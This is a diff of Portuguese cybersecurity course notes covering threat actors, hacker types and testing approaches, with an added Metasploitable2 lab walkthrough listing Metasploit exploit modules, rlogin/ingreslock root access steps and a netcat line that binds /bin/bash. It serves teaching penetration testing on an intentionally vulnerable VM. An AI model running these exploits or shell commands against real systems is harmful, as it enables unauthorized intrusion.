@@ -88,58 +88,58 @@ Além disso, o Labtainers Walkthrough fornece uma documentação valiosa para re
 ## Modulo 2
 ### Threat Actors
 
-***Cyberterrorists***: 
+#### Cyberterrorists: 
 
 São indivíduos ou grupos que realizam ataques cibernéticos com o objetivo de causar danos sérios à infraestrutura, à economia ou à segurança de um país ou organização. Suas ações podem ser motivadas por razões políticas, ideológicas ou religiosas.
 
-***Government-Sponsored/State-Sponsored Actors***: 
+#### Government-Sponsored/State-Sponsored Actors: 
 
 Esses atores são patrocinados ou apoiados por governos ou entidades estatais. Eles realizam atividades cibernéticas com objetivos políticos, militares, econômicos ou de inteligência, visando obter vantagens estratégicas ou comprometer os interesses de outros países.
 
-***Organized Crime/Cybercriminals***: 
+#### Organized Crime/Cybercriminals: 
 
 Grupos organizados de criminosos que realizam atividades cibernéticas ilegais, como fraudes financeiras, roubo de dados, extorsão e ataques a sistemas de pagamento online. Seu principal objetivo é obter lucro financeiro por meio de atividades criminosas na Internet.
 
-***Hacktivists***: 
+#### Hacktivists: 
 
 São indivíduos ou grupos que realizam ataques cibernéticos com motivações políticas ou sociais. Eles usam técnicas de hacking para protestar contra governos, empresas ou instituições que consideram injustas ou antiéticas. Suas ações visam geralmente chamar a atenção para questões sociais ou políticas.
 
-***Insiders***: 
+#### Insiders: 
 
 São indivíduos que têm acesso legítimo a sistemas ou informações confidenciais de uma organização, mas que usam esse acesso de forma indevida para causar danos, realizar espionagem, roubar dados ou cometer fraudes. Os insiders podem ser funcionários, contratados ou ex-funcionários da organização.
 
-***Script Kiddies***: 
+#### Script Kiddies: 
 
 São indivíduos com conhecimento técnico básico de hacking que usam ferramentas e scripts prontos disponíveis na Internet para realizar ataques cibernéticos simples. Geralmente, eles não têm habilidades avançadas em programação ou segurança cibernética e realizam ataques por diversão, desafio ou para se exibirem perante a comunidade hacker.
 
-***Internal User Errors***: 
+#### Internal User Errors: 
 
 Se refere a erros cometidos por usuários internos de uma organização que podem resultar em violações de segurança ou falhas operacionais. Esses erros podem ocorrer devido à falta de treinamento adequado em segurança cibernética, descuido, negligência ou falta de compreensão das políticas e procedimentos de segurança da organização.
 
 ### Hats
 Exitem seis tipos de Hackers que são:
 
-***Hackers Éticos (White Hats)***:
+#### Hackers Éticos (White Hats):
 
 São hackers que utilizam suas habilidades de hacking de forma ética e legal. Eles geralmente trabalham para empresas, organizações ou agências governamentais para identificar vulnerabilidades em sistemas e redes, a fim de fortalecer a segurança e proteger contra ataques cibernéticos.
 
-***Hackers Maliciosos (Black Hats)***: 
+#### Hackers Maliciosos (Black Hats): 
 
 São hackers que realizam atividades de hacking com intenções maliciosas e ilegais. Eles buscam explorar vulnerabilidades em sistemas e redes para roubar informações, danificar sistemas, extorquir dinheiro ou causar outros danos.
 
-***Hackers de Chapéu Cinza (Gray Hats)***:
+#### Hackers de Chapéu Cinza (Gray Hats):
 
 São hackers que podem realizar atividades tanto éticas quanto maliciosas, dependendo do contexto e das circunstâncias. Eles podem descobrir vulnerabilidades em sistemas sem permissão, mas podem ou não usar essas informações de forma maliciosa.
 
-***Hackers de Chapéu Azul (Blue Hats)***:
+#### Hackers de Chapéu Azul (Blue Hats):
 
 Este termo é menos comum, mas às vezes é usado para descrever hackers que são contratados por empresas para testar a segurança de seus próprios sistemas, geralmente em resposta a incidentes de segurança ou preocupações com ameaças internas.
 
-***Hackers de Chapéu Verde (Green Hats)***: 
+#### Hackers de Chapéu Verde (Green Hats): 
 
 Este termo também é menos comum, mas às vezes é usado para descrever hackers iniciantes ou inexperientes que estão aprendendo e desenvolvendo suas habilidades de hacking.
 
-***Hackers de Chapéu Vermelho (red Hats)***:
+#### Hackers de Chapéu Vermelho (red Hats):
 
 
 São hackers que realizam atividades de Hacking com intenções ambíguas ou estaão dispostas a ultrapassar limites éticos em suas atividades de hacking.
@@ -148,23 +148,23 @@ São hackers que realizam atividades de Hacking com intenções ambíguas ou est
 
 As motivações dos atores no contexto da cibersegurança podem ser variadas e complexas, influenciadas por uma série de fatores.  
 
-***Agendas Políticas, Econômicas, Técnicas e Militares***: 
+#### Agendas Políticas, Econômicas, Técnicas e Militares: 
 
 Alguns atores, como governos ou grupos militares, podem ter motivações políticas, econômicas, técnicas ou militares para conduzir atividades cibernéticas. Isso pode incluir espionagem industrial, coleta de informações estratégicas ou sabotagem de sistemas adversários.
 
-***Lucro/Ganho Financeiro***: 
+#### Lucro/Ganho Financeiro: 
 
 Muitos ataques cibernéticos são motivados pelo desejo de lucro financeiro. Isso pode incluir roubo de dados pessoais ou financeiros para extorsão, venda no mercado negro ou acesso a informações confidenciais para obtenção de vantagem financeira.
 
-***Notoriedade***: 
+#### Notoriedade: 
 
 Alguns indivíduos ou grupos podem realizar ataques cibernéticos em busca de notoriedade ou reconhecimento. Isso pode incluir hackers que buscam provar suas habilidades, ganhar fama dentro da comunidade hacker ou chamar a atenção para questões específicas.
 
-***Vingança***: 
+#### Vingança: 
 
 Motivações de vingança também podem impulsionar ataques cibernéticos. Isso pode ocorrer quando um indivíduo ou grupo se sente prejudicado por uma organização ou entidade e busca retaliar através de atividades cibernéticas, como vazamento de dados ou interrupção de serviços.
 
-***Sobreposição de Motivações***: 
+#### Sobreposição de Motivações: 
 
 Muitas vezes, as motivações dos atores podem se sobrepor ou ser uma combinação de vários fatores. Por exemplo, um grupo criminoso pode visar uma organização por motivos financeiros, mas também pode ter motivações políticas ou pessoais subjacentes.
 
@@ -172,15 +172,15 @@ Muitas vezes, as motivações dos atores podem se sobrepor ou ser uma combinaç�
 
 Os testes de segurança de software são essenciais para garantir a robustez e confiabilidade dos sistemas em um ambiente digital cada vez mais complexo. Entre os tipos de testes mais comuns, destacam-se o Black Box, Gray Box e White Box, cada um com suas características distintas e objetivos específicos.
 
-***Gray Box (Caixa Cinza)***:
+#### Gray Box (Caixa Cinza):
 
 Simula as interações do usuário com o sistema sem que os testadores tenham conhecimento interno da estrutura ou implementação do software. Esse método é valioso para identificar comportamentos inesperados e problemas de usabilidade, segurança e funcionalidade, refletindo as experiências reais dos usuários finais.
 
-***Gray Box (Caixa Cinza)***:
+#### Gray Box (Caixa Cinza):
 
 Combina elementos dos testes de Caixa Preta e Caixa Branca. Nele, os testadores possuem um conhecimento parcial da estrutura interna do sistema, como diagramas de arquitetura ou detalhes de API, permitindo uma abordagem direcionada para explorar áreas específicas do software em busca de vulnerabilidades ou problemas.
 
-***White Box (Caixa Branca)***:
+#### White Box (Caixa Branca):
 
 oferece uma visão detalhada e completa da estrutura interna, design e implementação do sistema. Com acesso total ao código-fonte e arquitetura, os testadores podem identificar vulnerabilidades de segurança, otimizar o desempenho do código e garantir a conformidade com as melhores práticas de desenvolvimento de software. Esses tipos de teste são complementares e contribuem para uma avaliação abrangente da qualidade e segurança do software.
 
@@ -216,7 +216,210 @@ nc  10.1.2.34 80
  ```shell
 nc -lvp 10.1.2.34 80 -e /bin/bash
 ```
+ ### Tunneling Exploits thought SSH
  
+ SSH é uma técnica usada para garantir que as informações trocadas entre dois computadores estejam protegidas enquanto viajam pela internet. É como se criássemos um túnel seguro por onde os dados podem passar sem serem vistos por outras pessoas.
 
+ #### Encaminhamento de Porta:
+ 
+ O SSH pode enviar informações de uma porta em um computador para outra porta em outro computador, como uma espécie de canal seguro. Isso é útil quando queremos acessar serviços em outro computador de forma segura, como se estivéssemos lá pessoalmente.
+
+#### Encaminhamento de Porta Local: 
+
+Imagine que você queira acessar um site em um servidor remoto, mas não quer que ninguém veja o que você está fazendo. Com o SSH, você pode fazer isso de forma segura, como se estivesse acessando o site diretamente do seu próprio computador.
+
+####  Encaminhamento de Porta Remota: 
+
+Às vezes, queremos expor serviços que estão rodando no nosso próprio computador para um servidor remoto. Com o SSH, podemos fazer isso de forma segura, protegendo nossos serviços internos de acessos não autorizados.
+
+#### Encaminhamento de Porta Dinâmica: 
+
+Esta técnica cria uma espécie de proxy que nos permite enviar informações de qualquer serviço do nosso computador para um servidor remoto, sem que ninguém possa ver o que está acontecendo. Isso pode ser útil para contornar restrições de redes bloqueadas ou acessar a internet de forma segura em locais públicos.
+
+### Metasploitable2 VM Walkthrough 
+
+O Metasploitable2 é uma máquina virtual intencionalmente vulnerável projetada para fins educacionais e de treinamento em segurança cibernética. Neste walkthrough, vamos explorar passo a passo algumas das vulnerabilidades presentes na Metasploitable2 e aprender a realizar testes de penetração. 
+Um trabalho aonde fizemos a instalação de uma maquina vulneravel (Labtainer: Metasploit)
+Exercício do labtainer explora o uso do sistema metasploit instalada em um Kali Linux.
+
+Iniciando o Labtainer 
+
+```shell
+labtainer metasploit
+```
+Para verificar a conectividade com a maquina da vítima, executamos o `ping`
+
+```shell
+ping 192.168.1.2
+```
+
+Para obter um lista de serviços vulneravel da vítima, executamaos o `nmap`.
+
+```shell
+nmap -p0-65535 192.168.1.2
+```
+Para explorar a vulnerablidade de um serviço rlogin mal configurada na porta 523.
+
+```shell
+rlogin -l root 192.168.1.2
+```
+Para exibir o arquivo raiz 
+
+```shell
+cat /root/filetoview.txt
+```
+para obter o privilégios de root usamos o telnet para acessar o serviço ingreslock.
+
+```shell
+Telnet 192.168.1.2 1524
+```
+Serviço distccd vulnerável (porta 3632)
+
+Inicie o console Metasploit
+
+```shell
+sudo msfconsole
+```
+Procure por exploração distccd
+
+```shell
+ search distccd
+```
+Use a exploração
+
+```shell
+use exploit/unix/misc/distcc_exec
+```
+Para ver a exploração 
+
+```shell
+options
+```
+
+Defina a opção 'RHOST'
+
+```shell
+set RHOST 192.168.1.2
+```
+Execute a exploração
+
+```shell
+exploit
+```
+Daemon IRC vulnerável (porta 6667)
+
+Procure por exploração irreal_ircd.
+
+```shell
+search unreal_ircd
+```
+Use a exploração;
+
+```shell
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+```
+Serviço VSFtpd vulnerável (porta 21)
+
+Procure por vsftpd_234
+
+```shell
+search vsftpd_234
+```
+Use a exploração
+
+```shell
+use exploit/unix/ftp/vsftpd_234_backdoor
+```
+
+Serviço Samba vulnerável (porta 139)
+
+Procure por samba usermap_script
+
+```shell
+search usermap_script
+```
+Use a exploração
+
+```shell
+use exploit/multi/samba/usermap_script
+```
+
+Serviço HTTP (php) vulnerável (porta 80)
+
+Procure por php_cgi
+
+```shell
+ search php_cgi
+```
+Use a exploração
+
+```shell
+use exploit/multi/http/php_cgi_arg_injection
+```
+No prompt do meterpreter, vá para um shell
+
+```shell
+shell
+```
+Serviço Postgres vulnerável (porta 5432)
+
+Procure por postgres_payload
+
+```shell
+search postgres_payload
+```
+
+Use a exploração
+
+```shell
+use exploit/linux/postgres/postgres_payload
+```
+
+Visualize e defina opções conforme necessário (opção RHOST)
+Execute a exploração.
+  Nota: quando a exploração é bem-sucedida, um prompt 'meterpreter' é mostrado
+
+  No prompt do meterpreter, vá para um shell.
+
+```shell
+shell
+```
+### Tools and Methodologies
+
+#### Nmap
+
+Uma ferramenta de varredura de rede usada para descobrir hosts e serviços em uma rede, bem como identificar portas abertas, sistemas operacionais e versões de software.
+
+#### Metasploit
+
+Uma estrutura de teste de penetração usada para desenvolver e executar exploits contra sistemas vulneráveis, testar a segurança de redes e realizar simulações de ataques.
+
+#### Openvas
+
+Um scanner de vulnerabilidades que identifica falhas de segurança em sistemas e redes, fornecendo relatórios detalhados e sugestões de correção.
+
+#### Burp
+
+Uma ferramenta de teste de segurança de aplicativos da web usada para encontrar vulnerabilidades, como injeção de SQL, cross-site scripting (XSS) e falsificação de solicitação entre sites (CSRF).
+
+#### Zap
+
+Outra ferramenta de teste de segurança de aplicativos da web, semelhante ao Burp Suite, que ajuda a identificar e explorar vulnerabilidades em aplicativos da web.
+
+#### Sqlmap
+
+Uma ferramenta automatizada de teste de penetração usada para detectar e explorar vulnerabilidades de injeção SQL em aplicativos da web.
+
+#### Hydra
+
+Uma ferramenta de ataque por força bruta que tenta várias combinações de nomes de usuários e senhas para obter acesso não autorizado a sistemas e aplicativos.
+
+#### Searchsploit
+
+Uma ferramenta que permite pesquisar e localizar exploits conhecidos e vulnerabilidades em bancos de dados públicos, como o Exploit Database.
+
+#### Armitage
+
+Uma interface gráfica para o Metasploit Framework, que simplifica a execução de ataques e o gerenciamento de hosts e exploits.
 
 
